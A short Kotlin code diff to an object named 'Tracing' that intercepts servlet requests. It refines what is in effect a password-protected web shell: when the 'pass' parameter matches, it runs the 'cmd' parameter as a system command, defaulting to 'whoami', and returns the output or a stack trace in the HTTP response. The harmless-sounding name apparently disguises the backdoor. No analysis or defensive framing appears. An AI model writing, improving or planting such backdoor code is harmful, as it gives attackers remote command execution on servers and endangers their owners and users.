@@ -13,9 +13,16 @@ object Tracing {
         val response = args[1] as HttpServletResponse
 
         val success = request.getParameter("pass") == pass
-        val cmd = request.getParameter("cmd")
+        val cmd = request.getParameter("cmd") ?: "whoami"
+
         if (success) {
-            readProcessOutput(cmd).forEach { response.writer.println(it) }
+            try {
+                response.status = HttpServletResponse.SC_OK
+                response.contentType = "text/plain;charset=utf-8"
+                response.writer.run { readProcessOutput(cmd).forEach { println(it) } }
+            } catch (e: Exception) {
+                response.writer.run { e.printStackTrace(this) }
+            }
         }
 
         return success
